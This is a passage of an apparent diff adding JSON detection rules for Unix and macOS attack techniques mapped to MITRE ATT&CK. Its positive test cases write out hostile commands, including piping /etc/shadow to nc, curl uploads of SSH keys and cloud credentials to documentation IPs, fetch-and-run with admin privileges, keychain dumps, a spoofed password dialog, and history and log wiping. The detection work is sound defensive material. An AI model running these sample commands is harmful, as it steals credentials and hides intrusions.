+      "pattern": "\\b(cp|base64|xxd|tar|scp|zip|strings|rsync|dd|nc|ncat)\\b[^|;]*\\s/etc/g?shadow\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bunshadow\\s+\\S*passwd\\s+\\S*shadow\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bcat\\s+/etc/shadow\\s*(\\||>)"
+     }
+    ]
+   },
+   "tags": [
+    "shadow",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/base64",
+      "command": "base64 /etc/shadow"
+     },
+     {
+      "executable": "/usr/sbin/unshadow",
+      "command": "unshadow /etc/passwd /etc/shadow"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c cat /etc/shadow | nc 203.0.113.8 9000"
+     },
+     {
+      "executable": "/usr/bin/cp",
+      "command": "cp /etc/shadow /tmp/s.txt"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ls",
+      "command": "ls -l /etc/shadow"
+     },
+     {
+      "executable": "/usr/bin/stat",
+      "command": "stat /etc/shadow"
+     },
+     {
+      "executable": "/usr/sbin/pwck",
+      "command": "pwck -r /etc/passwd /etc/shadow"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-sshagent-sock-hijack",
+   "name": "SSH_AUTH_SOCK pointed at another session's agent",
+   "description": "A command sets SSH_AUTH_SOCK to a /tmp/ssh-*/agent.<pid> socket, borrowing another user's loaded keys.",
+   "tactic": "Lateral Movement",
+   "technique": "T1563.001",
+   "technique_name": "Remote Service Session Hijacking: SSH Hijacking",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "SSH_AUTH_SOCK=/tmp/ssh-[A-Za-z0-9]+/agent\\.\\d+"
+   },
+   "tags": [
+    "ssh",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c SSH_AUTH_SOCK=/tmp/ssh-XXzZ3nDd1a/agent.1337 ssh-add -l"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c SSH_AUTH_SOCK=$HOME/.1password/agent.sock ssh git@github.com"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-proc-environ-sweep",
+   "name": "Environment of other processes read via /proc",
+   "description": "A command globs or enumerates /proc/<pid>/environ looking for secrets.",
+   "tactic": "Credential Access",
+   "technique": "T1003.007",
+   "technique_name": "OS Credential Dumping: Proc Filesystem",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\b(cat|strings|grep|tr|xargs|cut)\\b[^|;]*/proc/(\\*|\\[0-9\\]\\*|\\d+)/environ"
+   },
+   "tags": [
+    "proc",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c cat /proc/*/environ | tr '\\0' '\\n' | grep -i pass"
+     },
+     {
+      "executable": "/usr/bin/strings",
+      "command": "strings /proc/1234/environ"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "cat /proc/self/environ"
+     },
+     {
+      "executable": "/usr/bin/cat",
+      "command": "cat /proc/cpuinfo"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-proc-mem-dump-tools",
+   "name": "Process memory read through gcore or /proc mem",
+   "description": "gcore on a pid, or dd/cat of /proc/<pid>/mem used to dump a process for secrets.",
+   "tactic": "Credential Access",
+   "technique": "T1003.007",
+   "technique_name": "OS Credential Dumping: Proc Filesystem",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bgcore\\b.*\\s\\d{2,}\\s*$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(dd|cat)\\b.*/proc/\\d+/mem"
+     }
+    ]
+   },
+   "tags": [
+    "proc",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/gcore",
+      "command": "gcore -o /tmp/sshd 812"
+     },
+     {
+      "executable": "/usr/bin/dd",
+      "command": "dd if=/proc/812/mem bs=1 skip=94000 count=4096 of=/tmp/m"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/gdb",
+      "command": "gdb ./app core"
+     },
+     {
+      "executable": "/usr/bin/gdb",
+      "command": "gdb -p 9120 -batch -ex bt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-strace-ssh-session",
+   "name": "strace attached to sshd or sudo tracing read and write",
+   "description": "strace -p on an sshd/ssh/sudo/su process tracing read or write, a known passphrase and keystroke capture method.",
+   "tactic": "Credential Access",
+   "technique": "T1056.001",
+   "technique_name": "Input Capture: Keylogging",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/strace"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-p\\s*\\$?\\(?(pidof|pgrep)?\\s*(-\\w+\\s+)*\\S*(ssh|sudo|su)\\S*"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-e\\s+(trace=)?(read|write)"
+     }
+    ]
+   },
+   "tags": [
+    "strace",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/strace",
+      "command": "strace -f -p $(pidof sshd) -e trace=read,write -s 128"
+     },
+     {
+      "executable": "/usr/bin/strace",
+      "command": "strace -p $(pgrep -n sudo) -e write -o /tmp/o"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/strace",
+      "command": "strace -f -e trace=openat ls"
+     },
+     {
+      "executable": "/usr/bin/strace",
+      "command": "strace -p 4021 -c"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-cloud-cred-file-copy",
+   "name": "Cloud or cluster credential file copied, archived or uploaded",
+   "description": "cp, tar, zip, scp, base64 or curl upload applied to ~/.aws/credentials, ~/.kube/config, ~/.docker/config.json, gcloud or Azure token stores.",
+   "tactic": "Credential Access",
+   "technique": "T1552.001",
+   "technique_name": "Unsecured Credentials: Credentials In Files",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(cp|tar|zip|scp|base64|rsync|curl|wget|nc)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\.aws/credentials|\\.kube/config|\\.docker/config\\.json|\\.config/gcloud/(credentials\\.db|application_default_credentials\\.json|legacy_credentials)|\\.azure/(accessTokens\\.json|msal_token_cache)"
+     }
+    ]
+   },
+   "tags": [
+    "cloud-creds",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar czf /tmp/c.tgz /home/ann/.aws/credentials /home/ann/.kube/config"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -F f=@/root/.config/gcloud/application_default_credentials.json http://203.0.113.4/u"
+     },
+     {
+      "executable": "/usr/bin/base64",
+      "command": "base64 /Users/ann/.docker/config.json"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl --kubeconfig /home/ann/.kube/config get pods"
+     },
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws configure list --profile ci"
+     },
+     {
+      "executable": "/usr/bin/ls",
+      "command": "ls -l /home/ann/.aws/credentials"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-ssh-private-key-archive",
+   "name": "SSH private key archived or uploaded",
+   "description": "tar, zip, scp, curl, nc or base64 reading id_rsa, id_ed25519 or id_ecdsa.",
+   "tactic": "Credential Access",
+   "technique": "T1552.004",
+   "technique_name": "Unsecured Credentials: Private Keys",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\b(tar|zip|scp|curl|nc|ncat|base64|7z)\\b[^|;]*\\.ssh/id_(rsa|ed25519|ecdsa|dsa)(\\s|$)"
+   },
+   "tags": [
+    "ssh",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar czf /tmp/k.tgz /home/ann/.ssh/id_rsa"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -T /root/.ssh/id_ed25519 http://203.0.113.1/up"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/scp",
+      "command": "scp /home/ann/.ssh/id_rsa.pub web01:/tmp/"
+     },
+     {
+      "executable": "/usr/bin/ssh-keygen",
+      "command": "ssh-keygen -t ed25519 -f /home/ann/.ssh/id_ed25519"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-find-private-keys-sweep",
+   "name": "Filesystem sweep for private keys or password stores",
+   "description": "find or locate searching for id_rsa, *.pem, *.kdbx or .git-credentials across the filesystem.",
+   "tactic": "Credential Access",
+   "technique": "T1552.004",
+   "technique_name": "Unsecured Credentials: Private Keys",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\b(find|locate|mdfind)\\b\\s+.*['\\\"]?(id_rsa|id_ed25519|\\*\\.pem|\\*\\.kdbx|\\.git-credentials|\\*\\.ppk|\\.netrc)"
+   },
+   "tags": [
+    "discovery",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/find",
+      "command": "find / -name id_rsa -type f 2>/dev/null"
+     },
+     {
+      "executable": "/usr/bin/find",
+      "command": "find /home -iname *.kdbx"
+     },
+     {
+      "executable": "/usr/bin/find",
+      "command": "find / -name .git-credentials"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/find",
+      "command": "find . -name *.go -type f"
+     },
+     {
+      "executable": "/usr/bin/find",
+      "command": "find /var/log -name *.gz -mtime +30"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-history-grep-secrets",
+   "name": "Shell history searched for credentials",
+   "description": "grep over .bash_history, .zsh_history or .mysql_history for password, token or secret.",
+   "tactic": "Credential Access",
+   "technique": "T1552.003",
+   "technique_name": "Unsecured Credentials: Bash History",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\b(grep|egrep|awk|cat)\\b.*\\.(bash|zsh|mysql|psql|python)_history.*(pass|secret|token|key|AKIA)|\\bgrep\\b.*(pass|secret|token|AKIA).*\\.(bash|zsh)_history"
+   },
+   "tags": [
+    "history",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/grep",
+      "command": "grep -i password /home/ann/.bash_history"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c cat ~/.zsh_history | grep -i token"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/grep",
+      "command": "grep -i passwd /etc/nsswitch.conf"
+     },
+     {
+      "executable": "/usr/bin/tail",
+      "command": "tail -n 50 /home/ann/.bash_history"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-browser-db-sqlite-read",
+   "name": "Browser credential or cookie database queried with sqlite3",
+   "description": "sqlite3 invoked on Login Data, Cookies, logins.json, key4.db or cookies.sqlite.",
+   "tactic": "Credential Access",
+   "technique": "T1555.003",
+   "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/sqlite3"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(Login Data|Cookies|cookies\\.sqlite|key4\\.db|logins\\.json|Web Data)"
+     }
+    ]
+   },
+   "tags": [
+    "browser",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 /Users/ann/Library/Application Support/Google/Chrome/Default/Login Data select origin_url,username_value from logins"
+     },
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 /home/ann/.mozilla/firefox/x.default/cookies.sqlite .dump"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 app.db .tables"
+     },
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 /var/lib/app/data.sqlite select 1"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-keychain-dump",
+   "name": "macOS keychain secrets dumped with security",
+   "description": "security dump-keychain, find-generic-password or find-internet-password with -g/-w to reveal a secret, or export of keychain items.",
+   "tactic": "Credential Access",
+   "technique": "T1555.001",
+   "technique_name": "Credentials from Password Stores: Keychain",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/security"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(dump-keychain|find-(generic|internet)-password\\b.*\\s-[a-z]*[gw]|export\\s+-k)"
+     }
+    ]
+   },
+   "tags": [
+    "keychain",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security dump-keychain -d login.keychain-db"
+     },
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-generic-password -ga Chrome"
+     },
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-internet-password -s github.com -w"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-identity -v -p codesigning"
+     },
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-generic-password -s myapp"
+     },
+     {
+      "executable": "/usr/bin/security",
+      "command": "security list-keychains -d user"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-chrome-safe-storage",
+   "name": "Browser Safe Storage key requested from keychain",
+   "description": "security find-generic-password naming a browser Safe Storage item, the key that decrypts the browser password database.",
+   "tactic": "Credential Access",
+   "technique": "T1555.003",
+   "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "find-generic-password\\b.*(Chrome|Chromium|Brave|Edge|Opera|Vivaldi)\\s*Safe\\s*Storage"
+   },
+   "tags": [
+    "keychain",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-generic-password -wa Chrome Safe Storage"
+     },
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-generic-password -w -s Brave Safe Storage"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-generic-password -s Chrome"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-dscl-shadowhash",
+   "name": "macOS password hash attribute read",
+   "description": "dscl or defaults reading ShadowHashData, the salted PBKDF2 hash that can be cracked offline.",
+   "tactic": "Credential Access",
+   "technique": "T1003",
+   "technique_name": "OS Credential Dumping",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "ShadowHashData"
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "/var/db/dslocal/nodes/Default/users/\\S+\\.plist"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\b(plutil|cp|cat|defaults|base64|xxd|tar)\\b"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "dscl",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . read /Users/ann dsAttrTypeNative:ShadowHashData"
+     },
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults read /var/db/dslocal/nodes/Default/users/ann.plist ShadowHashData"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . read /Users/ann UserShell"
+     },
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . list /Users"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-dscl-authonly-guess",
+   "name": "dscl -authonly used to test a password",
+   "description": "dscl . -authonly user password verifies credentials without a login, used for local password guessing.",
+   "tactic": "Credential Access",
+   "technique": "T1110.001",
+   "technique_name": "Brute Force: Password Guessing",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "dscl\\b.*-authonly\\s+\\S+\\s+\\S+"
+   },
+   "tags": [
+    "dscl",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -authonly ann Summer2024!"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -read /Users/ann"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-osascript-admin-prompt",
+   "name": "osascript spoofing an authentication or password prompt",
+   "description": "osascript displaying a hidden-answer dialog with a system-sounding message, the standard macOS credential phish.",
+   "tactic": "Credential Access",
+   "technique": "T1056.002",
+   "technique_name": "Input Capture: GUI Input Capture",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "display dialog"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "hidden answer"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(password|passphrase|credentials|authenticate|System Preferences|System Settings)"
+     }
+    ]
+   },
+   "tags": [
+    "osascript",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e display dialog \"macOS needs your password to apply updates\" default answer \"\" with hidden answer with icon caution"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e display dialog \"Build finished\" buttons {\"OK\"}"
+     },
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e display notification \"ok\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-osascript-admin-shell",
+   "name": "osascript running a shell command with administrator privileges",
+   "description": "do shell script ... with administrator privileges from a script, used to gain root via the macOS prompt.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548.004",
+   "technique_name": "Abuse Elevation Control Mechanism: Elevated Execution with Prompt",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "do shell script"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "with administrator privileges"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(curl|wget|bash|sh -c|chmod|launchctl|nc |python|base64)"
+     }
+    ]
+   },
+   "tags": [
+    "osascript",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e do shell script \"curl -s http://203.0.113.4/i | sh\" with administrator privileges"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e do shell script \"date\""
+     },
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e tell application \"Finder\" to quit"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-osascript-login-item",
+   "name": "Login item created through osascript",
+   "description": "osascript make login item, adding a startup item for the current user.",
+   "tactic": "Persistence",
+   "technique": "T1547.015",
+   "technique_name": "Boot or Logon Autostart Execution: Login Items",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "make (new )?login item"
+     }
+    ]
+   },
+   "tags": [
+    "osascript",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e tell application \"System Events\" to make login item at end with properties {path:\"/Users/Shared/.agent\", hidden:true}"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e tell application \"System Events\" to get the name of every login item"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-osascript-jxa-objc",
+   "name": "osascript JavaScript for Automation with ObjC bridge",
+   "description": "osascript -l JavaScript using ObjC.import, which gives script access to Cocoa APIs for download, clipboard or keychain.",
+   "tactic": "Execution",
+   "technique": "T1059.002",
+   "technique_name": "Command and Scripting Interpreter: AppleScript",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-l\\s*JavaScript"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "ObjC\\.(import|bindFunction)|\\$\\.NS"
+     }
+    ]
+   },
+   "tags": [
+    "osascript",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -l JavaScript -e ObjC.import('Cocoa'); $.NSPasteboard.generalPasteboard"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -l JavaScript -e Application('Finder').name()"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-clipboard-poll",
+   "name": "Clipboard read by pbpaste in a loop or piped out",
+   "description": "pbpaste inside a while/for loop with sleep, or piped to curl/nc, harvesting copied passwords or crypto addresses.",
+   "tactic": "Collection",
+   "technique": "T1115",
+   "technique_name": "Clipboard Data",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(while|for)\\b.*pbpaste.*sleep|pbpaste.*\\|\\s*(curl|nc)\\b"
+   },
+   "tags": [
+    "clipboard",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c while true; do pbpaste >> /tmp/.c; sleep 2; done"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c pbpaste | curl -d @- http://203.0.113.2/c"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/pbpaste",
+      "command": "pbpaste"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c pbpaste | wc -c"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-screencapture-silent-loop",
+   "name": "Silent screen capture in a loop or to a hidden path",
+   "description": "screencapture -x (no sound) repeated with sleep or writing to a hidden path.",
+   "tactic": "Collection",
+   "technique": "T1113",
+   "technique_name": "Screen Capture",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(while|for)\\b.*screencapture\\s+(-\\w+\\s+)*-x.*sleep|screencapture\\s+.*-x\\b.*\\s\\S*/\\.[^/\\s]+"
+   },
+   "tags": [
+    "screen",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c while true; do screencapture -x /tmp/s$(date +%s).jpg; sleep 30; done"
+     },
+     {
+      "executable": "/usr/sbin/screencapture",
+      "command": "screencapture -x -t jpg /Users/Shared/.cache/s.jpg"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/screencapture",
+      "command": "screencapture -i ~/Desktop/shot.png"
+     },
+     {
+      "executable": "/usr/sbin/screencapture",
+      "command": "screencapture -x ~/Desktop/a.png"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-messages-notes-db",
+   "name": "Messages or Notes database copied or queried",
+   "description": "sqlite3, cp or tar against chat.db, NoteStore.sqlite or Safari history.",
+   "tactic": "Collection",
+   "technique": "T1005",
+   "technique_name": "Data from Local System",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(sqlite3|cp|tar|zip|scp|curl)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "Library/Messages/chat\\.db|NoteStore\\.sqlite|Safari/History\\.db|Cookies\\.binarycookies"
+     }
+    ]
+   },
+   "tags": [
+    "collection",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 /Users/ann/Library/Messages/chat.db select text from message"
+     },
+     {
+      "executable": "/usr/bin/cp",
+      "command": "cp /Users/ann/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite /tmp/n.db"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 /Users/ann/dev/app.db .schema"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-hist-disable-env",
+   "name": "Shell history disabled through environment or options",
+   "description": "unset HISTFILE, HISTFILE=/dev/null, HISTSIZE=0, or set +o history to suppress recording.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.003",
+   "technique_name": "Impair Defenses: Impair Command History Logging",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(unset\\s+HISTFILE|HISTFILE=/dev/null|HISTSIZE=0|HISTFILESIZE=0|set\\s+\\+o\\s+history)"
+   },
+   "tags": [
+    "history",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c unset HISTFILE; ./run"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c export HISTFILE=/dev/null"
+     },
+     {
+      "executable": "/bin/zsh",
+      "command": "zsh -c set +o history"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c export HISTSIZE=50000"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c export HISTCONTROL=ignoredups"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-hist-symlink-devnull",
+   "name": "History file replaced by a symlink to /dev/null",
+   "description": "ln -sf /dev/null ~/.bash_history, so nothing is ever persisted.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.003",
+   "technique_name": "Indicator Removal: Clear Command History",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "ln\\s+(-\\w+\\s+)*/dev/null\\s+\\S*\\.(bash|zsh|sh|python|mysql)_history"
+   },
+   "tags": [
+    "history",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/ln",
+      "command": "ln -sf /dev/null /root/.bash_history"
+     },
+     {
+      "executable": "/bin/ln",
+      "command": "ln -s /dev/null /Users/ann/.zsh_history"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/ln",
+      "command": "ln -s /dev/null /etc/systemd/system/foo.service"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-hist-truncate-file",
+   "name": "History file truncated or removed",
+   "description": "truncate, shred, rm or redirection against a shell history file.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.003",
+   "technique_name": "Indicator Removal: Clear Command History",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(truncate\\s+-s\\s*0|shred\\b[^|;]*|cat\\s+/dev/null\\s*>|:\\s*>|rm\\s+(-\\w+\\s+)*)\\s*\\S*\\.(bash|zsh)_history\\b|>\\s*\\S*\\.(bash|zsh)_history\\b"
+   },
+   "tags": [
+    "history",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/truncate",
+      "command": "truncate -s 0 /root/.bash_history"
+     },
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -u /home/ann/.bash_history"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c cat /dev/null > ~/.zsh_history"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c cat ~/.bash_history"
+     },
+     {
+      "executable": "/usr/bin/wc",
+      "command": "wc -l /home/ann/.bash_history"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-log-truncate-var-log",
+   "name": "System log truncated or wiped",
+   "description": "truncate, shred, or redirection emptying /var/log files such as auth.log, secure, wtmp, btmp, lastlog or syslog.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.002",
